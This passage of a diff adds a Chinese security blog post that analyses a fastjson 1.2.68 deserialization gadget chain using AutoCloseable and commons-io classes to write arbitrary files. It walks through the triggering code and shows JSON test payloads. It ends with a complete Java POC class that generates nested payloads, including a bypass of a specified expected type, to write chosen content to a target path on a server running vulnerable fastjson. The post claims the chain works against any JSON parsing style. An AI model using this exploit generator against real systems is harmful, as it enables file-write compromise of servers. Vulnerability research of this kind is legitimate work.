+bomInputStream.getBOM();
+bomInputStream.close();
+</code></pre>
+<p>getBOM作为这条链的入口，我们怎么调用这个get方法呢？</p>
+<p>我们利用反序列化 Map 对象的特性。在<code>JSONObject parseObject(String text)</code>方法中，首先调用<code>parse</code>进行反序列化，然后调用<code>JSON.toJSON</code>将对象转换成<code>JSONObject</code>对象。</p>
+<pre><code>public static JSONObject parseObject(String text) &#123;
+    Object obj = parse(text);
+    if (obj instanceof JSONObject) &#123;
+        return (JSONObject) obj;
+    &#125;
+
+    try &#123;
+        return (JSONObject) JSON.toJSON(obj);
+    &#125; catch (RuntimeException e) &#123;
+        throw new JSONException(&quot;can not cast to JSONObject.&quot;, e);
+    &#125;
+&#125;
+</code></pre>
+<p>在调用<code>JSON.toJSON</code>方法时候，当对象类型是 Map 对象时，将会调用 MapSerializer 的 <code>write</code> 方法获取 Map 中的键值对中的 value 的对象，并再次调用 <code>toJSON</code> 方法（递归自调用）。</p>
+<pre><code>if (javaObject instanceof Map) &#123;
+    Map&lt;Object, Object&gt; map = (Map&lt;Object, Object&gt;) javaObject;
+
+    int size = map.size();
+
+    Map innerMap;
+    if (map instanceof LinkedHashMap) &#123;
+        innerMap = new LinkedHashMap(size);
+    &#125; else if (map instanceof TreeMap) &#123;
+        innerMap = new TreeMap();
+    &#125; else &#123;
+        innerMap = new HashMap(size);
+    &#125;
+
+    JSONObject json = new JSONObject(innerMap);
+
+    for (Map.Entry&lt;Object, Object&gt; entry : map.entrySet()) &#123;
+        Object key = entry.getKey();
+        String jsonKey = TypeUtils.castToString(key);
+        Object jsonValue = toJSON(entry.getValue(), config);
+        json.put(jsonKey, jsonValue);
+    &#125;
+
+    return json;
+&#125;
+</code></pre>
+<p>处理这个 value 对象时，会调用 <code>javaBeanSerializer.getFieldValuesMap</code> 方法获取对象中的属性值。</p>
+<pre><code>if (serializer instanceof JavaBeanSerializer) &#123;
+    JavaBeanSerializer javaBeanSerializer = (JavaBeanSerializer) serializer;
+    
+    JSONObject json = new JSONObject();
+    try &#123;
+        //调用
+        Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);
+        for (Map.Entry&lt;String, Object&gt; entry : values.entrySet()) &#123;
+            json.put(entry.getKey(), toJSON(entry.getValue(), config));
+        &#125;
+    &#125; catch (Exception e) &#123;
+        throw new JSONException(&quot;toJSON error&quot;, e);
+    &#125;
+    return json;
+&#125;
+</code></pre>
+<p>这个方法调用 FieldSerializer 的 <code>getPropertyValue</code> 方法来获取属性值。</p>
+<p><img src="/images/20230523204654.png"></p>
+<p>调用 fieldInfo 的 <code>get</code> 方法获取获取属性值。</p>
+<p><img src="/images/20230523204759.png"></p>
+<p>这个方法通过反射调用对象 getter 方法获取值。</p>
+<p>这样就可以调用BOMInputStream 的 <code>getBOM</code> 方法，来触发后续的gadget链。</p>
+<p>测试数据：</p>
+<pre><code>&#123;
+    &quot;@type&quot;:&quot;java.util.Map&quot;,
+    &quot;aaa&quot;:&#123;
+        &quot;@type&quot;:&quot;com.study.fastjson.pojo.Person&quot;,
+        &quot;name&quot;:&quot;test&quot;,
+        &quot;age&quot;:17
+        &#125;
+&#125;
+</code></pre>
+<p><code>parseObject</code> 方法可以调用解析，那如果使用 <code>parse</code>方法呢？</p>
+<h4 id="parse-与-parseObject"><a href="#parse-与-parseObject" class="headerlink" title="parse 与 parseObject"></a>parse 与 parseObject</h4><p>fastjson 中的 <code>parse</code> 和 <code>parseObject</code> 方法都可以用来将 json 字符串反序列化成 Java 对象，<code>parseObject</code> 本质上也是调用 <code>parse</code> 进行反序列化的。但是 <code>parseObject</code> 会额外的将 Java 对象转为 JSONObject 对象，即 <code>JSON.toJSON()</code>。而在<code>JSON.toJSON()</code>中会可以利用反序列化 Map 对象的特性。自动调用value的<code>getter</code>方法，但是 <code>parse</code> 没有。</p>
+<p>因此，如果想要同时兼容 <code>parse</code> 和 <code>parseObject</code> 方法，就要找到一种方法可以让其在反序列化过程中调用到 <code>JSON.toString</code> 方法。</p>
+<p>在 fastjson 的反序列化过程中，会使用不同的处理器负责不同类型（class）的反序列化流程。在 <code>ParserConfig.initDeserializers()</code> 方法中定义。</p>
+<p>其中有一个 MiscCodec 方法，在 fastjson 1.2.47 使用 <code>java.lang.Class</code> 缓存绕过检查时曾经遇见过，不过这次使用的类，是 <code>java.util.Currency</code>。</p>
+<p>在 MiscCodec 的 deserialze 方法中，会解析 “val” 中的内容放入 objVal 中，并对其进行解析。</p>
+<pre><code>if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;
+    parser.resolveStatus = DefaultJSONParser.NONE;
+    parser.accept(JSONToken.COMMA);
+
+    if (lexer.token() == JSONToken.LITERAL_STRING) &#123;
+        if (!&quot;val&quot;.equals(lexer.stringVal())) &#123;
+            throw new JSONException(&quot;syntax error&quot;);
+        &#125;
+        lexer.nextToken();
+    &#125; else &#123;
+        throw new JSONException(&quot;syntax error&quot;);
+    &#125;
+
+    parser.accept(JSONToken.COLON);
+    //解析
+    objVal = parser.parse();
+    
+    parser.accept(JSONToken.RBRACE);
+&#125;
+</code></pre>
+<p>下面是解析objVal的逻辑，如果 objVal 是 JSONObject 对象，并且 @type 的 clazz 是 Currency 对象的话，会调用 JSONObject 的 getString 方法获取 key 为 currency 的值，如果值为 null 则获取 key 为 currencyCode 的值。</p>
+<pre><code>if (objVal instanceof JSONObject) &#123;
+    JSONObject jsonObject = (JSONObject) objVal;
+
+    if (clazz == Currency.class) &#123;
+        String currency = jsonObject.getString(&quot;currency&quot;);
+        if (currency != null) &#123;
+            return (T) Currency.getInstance(currency);
+        &#125;
+
+        String symbol = jsonObject.getString(&quot;currencyCode&quot;);
+        if (symbol != null) &#123;
+            return (T) Currency.getInstance(symbol);
+        &#125;
+    &#125;
+
+    if (clazz == Map.Entry.class) &#123;
+        return (T) jsonObject.entrySet().iterator().next();
+    &#125;
+
+    return jsonObject.toJavaObject(clazz);
+&#125;
+throw new JSONException(&quot;expect string&quot;);
+</code></pre>
+<p><code>getString</code>方法会调用了其 value 对象的 toString 方法，如果这个对象为 JSONObject ，那就会调用 JSONObject 的 <code>toString</code> 方法，就是 <code>JSON.toString</code>，调用 <code>toJSONString</code> 方法，如果其中是 Map 类型的数据，就可以按照之前的分析触发 getter 方法的调用。调用栈如下：</p>
+<pre><code>getAddress:9, Person (com.study.fastjson.pojo)
+write:-1, ASMSerializer_1_Person (com.alibaba.fastjson.serializer)
+write:271, MapSerializer (com.alibaba.fastjson.serializer)
+write:44, MapSerializer (com.alibaba.fastjson.serializer)
+write:271, MapSerializer (com.alibaba.fastjson.serializer)
+write:44, MapSerializer (com.alibaba.fastjson.serializer)
+write:285, JSONSerializer (com.alibaba.fastjson.serializer)
+toJSONString:973, JSON (com.alibaba.fastjson)
+toString:967, JSON (com.alibaba.fastjson)
+getString:325, JSONObject (com.alibaba.fastjson)
+deserialze:279, MiscCodec (com.alibaba.fastjson.serializer)
+parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1401, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1367, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:183, JSON (com.alibaba.fastjson)
+parse:193, JSON (com.alibaba.fastjson)
+parse:149, JSON (com.alibaba.fastjson)
+main:35, FastJson_Getter_Test (com.study.fastjson.v68)
+</code></pre>
+<p>测试数据：</p>
+<pre><code>&#123;
+    &quot;@type&quot;: &quot;java.util.Currency&quot;,
+    &quot;val&quot;: &#123;
+        &quot;currency&quot;: &#123;
+            &quot;abc&quot;: &#123;
+                &quot;@type&quot;:&quot;java.util.Map&quot;,
+                &quot;aaa&quot;:&#123;
+                    &quot;@type&quot;:&quot;com.study.fastjson.pojo.Person&quot;,
+                    &quot;name&quot;:&quot;test&quot;,
+                    &quot;age&quot;:17
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>如果不写 <code>&quot;@type&quot;: &quot;java.util.Map&quot;</code>，同样可以触发 getter&#x2F;setter 方法，因为在不使用 @type 指定类时，这种键值对的写法会被处理成 JSONObject，同样使用 MapSerializer 处理，能够进行触发。</p>
+<h4 id="指定-class-对象"><a href="#指定-class-对象" class="headerlink" title="指定 class 对象"></a>指定 class 对象</h4><p>在外面嵌套一层键值，用来兼容当指定了反序列化的期待类时的情况：</p>
+<p>{“test”:{payload}}</p>
+<p>这是为了兼容如果 fastjson 在解析时指定了类型 <code>JSON.parseObject(json,Test.class)</code>。此时如果我们想用 <code>@type</code> 去指定类型解析，程序将会在 checkAutoType 时抛出 <code>type not match</code> 异常，我们需要在 payload 的 json 外再包裹一层来绕过。</p>
+<p>绕过原因：在指定了类后，fastjson 就会直接尝试创建这个类，即使我们给他传递的 field（也就是上面的 test）指定类里没有。但是 fastjson 还是会继续处理和反序列化其中的内容。</p>
+<p>但是这种情况还有一个限制，那就是需要 fastjson 指定的类有无参的构造方法，否则将可能无法创建类。</p>
+<h4 id="文件写出"><a href="#文件写出" class="headerlink" title="文件写出"></a>文件写出</h4><p>如果将流中的内容写到文件中？</p>
+<ol>
+<li>找到触发调用 close&#x2F;flush 一类的方法</li>
+<li>在缓冲区写满了之后，会触发自动写出文件内容</li>
+</ol>
+<p>利用方式2，WriterOutputStream 写出流内容依赖其中的 Writer 对象，在我们的调用链中，使用了 FileWriterWithEncoding 。这个方法实际上是 OutputStreamWriter 的完全封装，在创建了 FileOutputStream 后使用 OutputStreamWriter 进行封装。</p>
+<pre><code> private static Writer initWriter(File file, Object encoding, boolean append) throws IOException &#123;
+    if (file == null) &#123;
+        throw new NullPointerException(&quot;File is missing&quot;);
+    &#125;
+    if (encoding == null) &#123;
+        throw new NullPointerException(&quot;Encoding is missing&quot;);
+    &#125;
+    boolean fileExistedAlready = file.exists();
+    OutputStream stream = null;
+    Writer writer = null;
+    try &#123;
+        stream = new FileOutputStream(file, append);
+        if (encoding instanceof Charset) &#123;
+            writer = new OutputStreamWriter(stream, (Charset)encoding);
+        &#125; else if (encoding instanceof CharsetEncoder) &#123;
+            writer = new OutputStreamWriter(stream, (CharsetEncoder)encoding);
+        &#125; else &#123;
+            writer = new OutputStreamWriter(stream, (String)encoding);
+        &#125;
+    &#125;
+</code></pre>
+<p>OutputStreamWriter 利用了StreamEncoder，默认缓冲区大小是8192</p>
+<pre><code>public OutputStreamWriter(OutputStream out, Charset cs) &#123;
+    super(out);
+    if (cs == null)
+        throw new NullPointerException(&quot;charset&quot;);
+    se = StreamEncoder.forOutputStreamWriter(out, this, cs);
+&#125;
+
+public class StreamEncoder extends Writer &#123;
+    private static final int DEFAULT_BYTE_BUFFER_SIZE = 8192;
+</code></pre>
+<p>在执行写文件的实现方法中，会判断当前缓冲区内容管是否溢出，如果有溢出，则执行写出动作。</p>
+<pre><code>void implWrite(char[] var1, int var2, int var3) throws IOException &#123;
+        CharBuffer var4 = CharBuffer.wrap(var1, var2, var3);
+        if (this.haveLeftoverChar) &#123;
+            this.flushLeftoverChar(var4, false);
+        &#125;
+
+        while(var4.hasRemaining()) &#123;
+            CoderResult var5 = this.encoder.encode(var4, this.bb, false);
+            if (var5.isUnderflow()) &#123;
+                assert var4.remaining() &lt;= 1 : var4.remaining();
+
+                if (var4.remaining() == 1) &#123;
+                    this.haveLeftoverChar = true;
+                    this.leftoverChar = var4.get();
+                &#125;
+                break;
+            &#125;
+            //判断缓冲区溢出
+            if (var5.isOverflow()) &#123;
+                assert this.bb.position() &gt; 0;
+
+                this.writeBytes();
+            &#125; else &#123;
+                var5.throwException();
+            &#125;
+        &#125;
+
+    &#125;
+</code></pre>
+<h3 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a>生成代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line">package com.study.fastjson.v68;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* fastjson 1.2.68 autocloseable commons-io poc 生成工具类</span><br><span class="line">*</span><br><span class="line">*/</span><br><span class="line">public class POC &#123;</span><br><span class="line"></span><br><span class="line">    public static final String AUTOCLOSEABLE_TAG = &quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 在 payload 外包裹一层绕过指定类型</span><br><span class="line">    *</span><br><span class="line">    * @param payload payload</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String bypassSpecializedClass(String payload) &#123;</span><br><span class="line">        return &quot;&#123;\&quot;test\&quot;:&quot; + payload + &quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 使用 Currency 类解析调用 &quot;currency&quot; 中 value 的 toString 方法，使用 JSONObject 方法调用 toJSONString</span><br><span class="line">    *</span><br><span class="line">    * @param payload payload</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String useCurrencyTriggerAllGetter(String payload, boolean ref) &#123;</span><br><span class="line">        return String.format(&quot;&#123;\&quot;@type\&quot;:\&quot;java.util.Currency\&quot;,\&quot;val\&quot;:&#123;\&quot;currency\&quot;:%s%s&#125;&#125;%s&quot;,</span><br><span class="line">                (ref ? &quot;&quot; : &quot;&#123;\&quot;text\&quot;:&quot;), payload, (ref ? &quot;&quot; : &quot;&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 CharSequenceInputStream 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param content 写入内容</span><br><span class="line">    * @param ref     是否使用引用对象</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateCharSequenceInputStream(String content, boolean ref) &#123;</span><br><span class="line">        int mod = 8192 - content.length() % 8192;</span><br><span class="line"></span><br><span class="line">        StringBuilder contentBuilder = new StringBuilder(content);</span><br><span class="line">        for (int i = 0; i &lt; mod+1; i++) &#123;</span><br><span class="line">            contentBuilder.append(&quot; &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.CharSequenceInputStream\&quot;,&quot; +</span><br><span class="line">                        &quot;\&quot;charset\&quot;:\&quot;UTF-8\&quot;,\&quot;bufferSize\&quot;:4,\&quot;s\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.String\&quot;\&quot;%s\&quot;&#125;&quot;,</span><br><span class="line">                ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, contentBuilder);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 FileWriterWithEncoding 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param filePath 要写入的文件位置</span><br><span class="line">    * @param ref      是否使用引用对象</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateFileWriterWithEncoding(String filePath, boolean ref) &#123;</span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.FileWriterWithEncoding\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;file\&quot;:\&quot;%s\&quot;,\&quot;encoding\&quot;:\&quot;UTF-8\&quot;&#125;&quot;, ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, filePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 WriterOutputStream 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param writer writer 对象反序列化字符串</span><br><span class="line">    * @param ref    是否使用引用对象</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateWriterOutputStream(String writer, boolean ref) &#123;</span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.WriterOutputStream\&quot;,\&quot;writeImmediately\&quot;:true,&quot; +</span><br><span class="line">                        &quot;\&quot;bufferSize\&quot;:4,\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;writer\&quot;:%s&#125;&quot;,</span><br><span class="line">                ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, writer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 TeeInputStream 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param inputStream  inputStream 类</span><br><span class="line">    * @param outputStream outputStream 类</span><br><span class="line">    * @param ref          是否使用引用对象</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateTeeInputStream(String inputStream, String outputStream, boolean ref) &#123;</span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\&quot;input\&quot;:%s,&quot; +</span><br><span class="line">                &quot;\&quot;closeBranch\&quot;:true,\&quot;branch\&quot;:%s&#125;&quot;, ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, inputStream, outputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 BOMInputStream 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param inputStream inputStream 类</span><br><span class="line">    * @param size        读取 byte 大小</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateBOMInputStream(String inputStream, int size) &#123;</span><br><span class="line"></span><br><span class="line">        int nums = size / 8192;</span><br><span class="line">        int mod  = size % 8192;</span><br><span class="line"></span><br><span class="line">        if (mod != 0) &#123;</span><br><span class="line">            nums = nums + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder bytes = new StringBuilder(&quot;0&quot;);</span><br><span class="line">        for (int i = 0; i &lt; nums * 8192; i++) &#123;</span><br><span class="line">            bytes.append(&quot;,0&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.BOMInputStream\&quot;,\&quot;delegate\&quot;:%s,&quot; +</span><br><span class="line">                        &quot;\&quot;boms\&quot;:[&#123;\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;bytes\&quot;:[%s]&#125;]&#125;&quot;,</span><br><span class="line">                AUTOCLOSEABLE_TAG, inputStream, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 读取文件内容字符串</span><br><span class="line">    *</span><br><span class="line">    * @param file 文件路径</span><br><span class="line">    * @return 返回字符串</span><br><span class="line">    */</span><br><span class="line">    public static String readFile(File file) &#123;</span><br><span class="line">        String result = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            result = FileUtils.readFileToString(file);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成普通 payload</span><br><span class="line">    *</span><br><span class="line">    * @param payloadFile    写入文件本地存储位置</span><br><span class="line">    * @param targetFilePath 写出目标文件位置</span><br><span class="line">    * @return 返回 payload</span><br><span class="line">    */</span><br><span class="line">    public static String generatePayload(String payloadFile, String targetFilePath) &#123;</span><br><span class="line">        File   file        = new File(payloadFile);</span><br><span class="line">        String fileContent = readFile(file);</span><br><span class="line">        if (!&quot;&quot;.equals(fileContent)) &#123;</span><br><span class="line">            return bypassSpecializedClass(</span><br><span class="line">                    useCurrencyTriggerAllGetter(</span><br><span class="line">                            generateBOMInputStream(</span><br><span class="line">                                    generateTeeInputStream(generateCharSequenceInputStream(fileContent, false),</span><br><span class="line">                                            generateWriterOutputStream(</span><br><span class="line">                                                    generateFileWriterWithEncoding(targetFilePath, false),</span><br><span class="line">                                                    false),</span><br><span class="line">                                            false),</span><br><span class="line">                                    (int) file.length()),</span><br><span class="line">                            false));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成引用型 payload</span><br><span class="line">    *</span><br><span class="line">    * @param payloadFile    写入文件本地存储位置</span><br><span class="line">    * @param targetFilePath 写出目标文件位置</span><br><span class="line">    * @return 返回 payload</span><br><span class="line">    */</span><br><span class="line">    public static String generateRefPayload(String payloadFile, String targetFilePath) &#123;</span><br><span class="line">        File   file        = new File(payloadFile);</span><br><span class="line">        String fileContent = readFile(file);</span><br><span class="line">        if (!&quot;&quot;.equals(fileContent)) &#123;</span><br><span class="line">            return bypassSpecializedClass(</span><br><span class="line">                    useCurrencyTriggerAllGetter(</span><br><span class="line">                            &quot;&#123;\&quot;writer\&quot;:&quot; + generateFileWriterWithEncoding(targetFilePath, true) +</span><br><span class="line">                                    &quot;,\&quot;outputStream\&quot;:&quot; + generateWriterOutputStream(&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.writer\&quot;&#125;&quot;, true) +</span><br><span class="line">                                    &quot;,\&quot;charInputStream\&quot;:&quot; + generateCharSequenceInputStream(fileContent, true) +</span><br><span class="line">                                    &quot;,\&quot;teeInputStream\&quot;:&quot; + generateTeeInputStream(&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.charInputStream\&quot;&#125;&quot;, &quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.outputStream\&quot;&#125;&quot;, true) +</span><br><span class="line">                                    &quot;,\&quot;inputStream\&quot;:&quot; + generateBOMInputStream(&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.teeInputStream\&quot;&#125;&quot;, (int) file.length()) + &quot;&#125;&quot;</span><br><span class="line">                            , true</span><br><span class="line">                    )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String file   = &quot;E:/a/12.txt&quot;;</span><br><span class="line">        String target = &quot;E:/a/1234.txt&quot;;</span><br><span class="line"></span><br><span class="line">        // 正常调用 payload 生成</span><br><span class="line">        String payload = generatePayload(file, target);</span><br><span class="line"></span><br><span class="line">        // 引用类型 payload 生成</span><br><span class="line">        String payloadWithRef = generateRefPayload(file, target);</span><br><span class="line"></span><br><span class="line">//		以下三种调用方式均可兼容，触发反序列化</span><br><span class="line">//        JSON.parse(payload);</span><br><span class="line">//		JSON.parse(payloadWithRef);</span><br><span class="line">        JSON.parseObject(payloadWithRef);</span><br><span class="line">//		JSON.parseObject(payloadWithRef,POC.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h3><p>在这条反序列化调用链中，我们一共使用了 fastjson 的如下几个特性：</p>
+<ol>
+<li>fastjson 优先将 json 中的参数交给构造方法去调用，这扩展了 fastjson 反序列化的漏洞面，不局限于 getter&#x2F;setter 方法，也可以使用构造方法的参数传递变量，进行类的初始化；</li>
+<li>对 getter 方法的定义宽泛，无需有相关成员变量，只要命名为 “getXXX” 类型的方法，fastjson 就会认为其为 getter 方法进行调用，这就不局在限于成员变量中的 getter 方法，只要叫 getXXX 的方法都可以成为触发漏洞的方法；</li>
+<li>反序列化一个 Map（JSONObject 也是 Map 的实现） 对象时，会使用 MapSerializer 的 writer 方法执行获取 value 对象的各项属性的操作，会反射调用 value 对象中的 getter 方法；</li>
+<li>如果反序列化的指定类是 <code>java.util.Currency</code> ，使用 MiscCodec 的 deserialze 方法，获取 currencyCode 或者 currency 的值，并调用其 toString 方法，如果这个值的类是 JSONObject 方法，将会调用 JSONObject 的 toString，也就是 JSON.toJSONString，触发 getter&#x2F;setter 方法的调用；</li>
+<li>指定类型反序列化时，不论参数是否对应，fastjson 都会去创建对象，并处理相关内容，因此使用外层嵌套可以绕过指定期待类进行反序列化；</li>
+<li>使用 AutoCloseable 子类绕过 AutoType 检测，尝试读写文件。</li>
+</ol>
+<p>结合这 6 条特性， 可以通杀服务器上任意一种写法的 json 解析，并且可以指定调用任意符合条件的 getter&#x2F;setter&#x2F;构造方法，大大扩大了漏洞挖掘的范围。</p>
